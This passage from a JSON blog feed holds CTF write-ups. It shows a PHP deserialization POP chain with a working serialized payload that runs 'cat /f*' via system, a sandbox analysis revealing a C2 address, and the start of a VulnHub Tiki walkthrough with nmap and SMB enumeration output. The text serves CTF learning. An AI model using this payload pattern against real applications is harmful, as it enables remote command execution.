variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>再次把 <code>eval</code>  改成  <code>echo</code> ，即可得到源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">shi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$next</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token class-name static-context\">next</span><span class=\"token operator\">::</span><span class=\"token function\">PLZ</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wo</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$sex</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hi Try serialize Me!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sex</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"🙅18岁🈲\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$do</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$do</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"==================PLZ Input Your Name!==================\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$b</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"'k1fuhu's test demo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登录成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>接下来是反序列化</p>\n<blockquote>\n<p>wo::__destruct =&gt; wo::inspect =&gt; shi::__toString =&gt; Demo:: __callStatic</p>\n</blockquote>\n<p>pop 链：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">shi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$next</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cat /f*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token class-name static-context\">next</span><span class=\"token operator\">::</span><span class=\"token function\">PLZ</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wo</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$sex</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hi Try serialize Me!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sex</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"🙅18岁🈲\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$do</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$do</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">wo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">shi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span class=\"token operator\">-></span><span class=\"token property\">next</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">// O:2:\"wo\":3:&#123;s:3:\"sex\";s:3:\"boy\";s:3:\"age\";s:8:\"eighteen\";s:9:\"intention\";O:3:\"shi\":2:&#123;s:4:\"next\";O:4:\"Demo\":1:&#123;s:1:\"a\";N;&#125;s:4:\"pass\";s:7:\"cat /f*\";&#125;&#125;</span></span></pre></td></tr></table></figure><pre><code>POST: username=O:2:&quot;wo&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:8:&quot;eighteen&quot;;s:9:&quot;intention&quot;;O:3:&quot;shi&quot;:2:&#123;s:4:&quot;next&quot;;O:4:&quot;Demo&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:4:&quot;pass&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&amp;password=system\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"来打cs咯\"><a class=\"markdownIt-Anchor\" href=\"#来打cs咯\">#</a> 来打 CS 咯</h3>\n<blockquote>\n<p>逆天 re，病毒分析，没拖进 ida 先拖到云沙箱里面分析一下，直接分析・出来了</p>\n</blockquote>\n<p><img data-src=\"/img/qsnctf_round1/RE.JPG\" alt=\"img\"></p>\n<p><img data-src=\"/img/qsnctf_round1/2.JPG\" alt=\"img\"></p>\n<blockquote>\n<p>在这里就看到了 ip 和端口，</p>\n</blockquote>\n<blockquote 10.0.80.253:8118=\"\">\n<p>flag：qsnctf</p>\n</blockquote>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/02/24/The-attacker-used-an-0day/",
            "url": "https://yhuanhuan01.github.io/2024/02/24/The-attacker-used-an-0day/",
            "title": "The attacker used an 0day",
            "date_published": "2024-02-24T14:35:04.000Z",
            "content_html": "<h1 id=\"tiki-1\"><a class=\"markdownIt-Anchor\" href=\"#tiki-1\">#</a> TIKI: 1</h1>\n<blockquote>\n<p>Download</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGlraS0xLDUyNS8jdG9w\">Back to the Top</span></p>\n<p>Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!</p>\n<ul>\n<li><strong>Tiki.ova</strong> (Size: 4.3GB)</li>\n<li><strong>Download</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xRDg1M0dtWTJwdUt3N2Z4Ql9oSVlWamMyS1M1WVR6MTkvdmlldz91c3A9c2hhcmluZw==\">https://drive.google.com/file/d/1D853GmY2puKw7fxB_hIYVjc2KS5YTz19/view?usp=sharing</span></li>\n<li><strong>Download (Mirror)</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90aWtpL1Rpa2kub3Zh\">https://download.vulnhub.com/tiki/Tiki.ova</span></li>\n</ul>\n</blockquote>\n<h2 id=\"description\"><a class=\"markdownIt-Anchor\" href=\"#description\">#</a> Description</h2>\n<blockquote>\n<p>Oh no our webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Investigate that.</p>\n<p>This is an OSCP Prep Box, its based on a CVE I recently found. Its on the OSCP lab machines level.</p>\n<p>If you need hints contact me on Twitter: S1lky_1337, should work on VirtualBox and Vmware.</p>\n</blockquote>\n<h4 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<blockquote>\n<p>┌──(root ㉿ yhuanhuan)-[/home/kali]<br>\n└─# nmap 192.168.85.145 -p 1-65535<br>\nStarting Nmap 7.94 ( <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubWFwLm9yZw==\">https://nmap.org</span> ) at 2024-02-24 06:39 EST<br>\nNmap scan report for 192.168.85.145<br>\nHost is up (0.00025s latency).<br>\nNot shown: 65531 closed tcp ports (reset)<br>\nPORT    STATE SERVICE<br>\n22/tcp  open  ssh<br>\n80/tcp  open  http<br>\n139/tcp open  netbios-ssn<br>\n445/tcp open  microsoft-ds<br>\nMAC Address: 00:0C:29:74:35:F1 (VMware)</p>\n</blockquote>\n<p>nmap, 开了 22，80，139 和 445 端口</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hdXRvcmVjb24tOWM5bnA3OXJvYzlhM3A2YS5weQ==\">使用脚本 autorecon.py</span></p>\n</blockquote>\n<p>445 端口</p>\n<blockquote>\n<p>[+] IP: 192.168.85.145:445\tName: 192.168.85.145      \tStatus: \u001b[32mAuthenticated\u001b[0m<br>\nDisk                                                  \tPermissions\tComment</p>\n<hr>\n<p>​\tprint$                                            \t\u001b[31mNO ACCESS\u001b[0m\tPrinter Drivers<br>\n​\tNotes (目录)                                             \t\u001b[33mREAD ONLY\u001b[0m\tMy Notes<br>\n​\t./Notes<br>\n​\tdr–r--r--                0 Wed Jul 29 09:52:09 2020\t.<br>\n​\tdr–r--r--                0 Thu Jul 30 15:32:11 2020\t…<br>\n​\tfr–r--r--              244 Wed Jul 29 09:52:05 2020\tMail.txt<br>\n​\tIPC$                                              \t\u001b[31mNO ACCESS\u001b[0m\tIPC Service (ubuntu server (Samba, Ubuntu))</p>\n</blockquote>\n<p>存在 Mail.txt 文件</p>\n<p>80 端口</p>\n<blockquote>\n<p>200      GET      469l     1513w    49414c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGlraS1pbmRleC5waHA=\">http://192.168.85.145/tiki/tiki-index.php</span><br>\n200      GET       15l       74w     6147c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L2ljb25zL3VidW50dS1sb2dvLnBuZw==\">http://192.168.85.145/icons/ubuntu-logo.png</span><br>\n200      GET      375l      964w    10918c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1Lw==\">http://192.168.85.145/</span><br>\n200      GET      375l      964w    10918c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L2luZGV4Lmh0bWw=\">http://192.168.85.145/index.html</span><br>\n<strong>200      GET        3l        5w       42c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3JvYm90cy50eHQ=\">http://192.168.85.145/robots.txt</span></strong><br>\n200      GET     1105l     3225w    29168c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL2NvbG9yYm94L2pxdWVyeS5jb2xvcmJveC5qcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/colorbox/jquery.colorbox.js</span><br>\n200      GET        1l      163w     1533c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvc2FmYXJpLXBpbm5lZC10YWIuc3Zn\">http://192.168.85.145/tiki/themes/base_files/favicons/safari-pinned-tab.svg</span><br>\n200      GET       72l      237w     1692c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL2ljb25zZXRzLmpz\">http://192.168.85.145/tiki/lib/jquery_tiki/iconsets.js</span><br>\n200      GET      214l      697w     6583c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2FqYXgvYXV0b3NhdmUuanM=\">http://192.168.85.145/tiki/lib/ajax/autosave.js</span><br>\n200      GET       24l       80w     2159c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvaW1nL3NwaW5uZXIuZ2lm\">http://192.168.85.145/tiki/img/spinner.gif</span><br>\n200      GET     1311l     3479w    36444c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2NvbXBvbmVudHMvanF1ZXJ5dWkvdGhlbWVzL2ZsaWNrL2pxdWVyeS11aS5jc3M=\">http://192.168.85.145/tiki/vendor_bundled/vendor/components/jqueryui/themes/flick/jquery-ui.css</span><br>\n200      GET     2280l     8947w    66245c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL3RhZ2NhbnZhcy9qcXVlcnkudGFnY2FudmFzLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/tagcanvas/jquery.tagcanvas.js</span><br>\n200      GET     4305l    12949w   123816c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL3Rpa2ktanF1ZXJ5Lmpz\">http://192.168.85.145/tiki/lib/jquery_tiki/tiki-jquery.js</span><br>\n200      GET       45l      270w     1536c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGFuZy9lbi9sYW5ndWFnZS5qcw==\">http://192.168.85.145/tiki/lang/en/language.js</span><br>\n200      GET       17l       28w      436c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2NhcHRjaGEvY2FwdGNoYWxpYi5qcw==\">http://192.168.85.145/tiki/lib/captcha/captchalib.js</span><br>\n200      GET      357l     1792w    13839c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL3Rpa2ktY29uZmlybS5qcw==\">http://192.168.85.145/tiki/lib/jquery_tiki/tiki-confirm.js</span><br>\n200      GET     2291l     8530w    78475c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS9qcXVlcnktdGltZXBpY2tlci1hZGRvbi9kaXN0L2pxdWVyeS11aS10aW1lcGlja2VyLWFkZG9uLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery/jquery-timepicker-addon/dist/jquery-ui-timepicker-addon.js</span><br>\n200      GET     4556l     7744w    72670c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2Jvd2VyLWFzc2V0L2ZvbnRhd2Vzb21lL2Nzcy9hbGwuY3Nz\">http://192.168.85.145/tiki/vendor_bundled/vendor/bower-asset/fontawesome/css/all.css</span><br>\n200      GET    18706l    71547w   520714c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2NvbXBvbmVudHMvanF1ZXJ5dWkvanF1ZXJ5LXVpLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/components/jqueryui/jquery-ui.js</span><br>\n200      GET     8065l    26342w   265027c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2RhcmtseS9jc3MvZGFya2x5LmNzcw==\">http://192.168.85.145/tiki/themes/darkly/css/darkly.css</span><br>\n200      GET        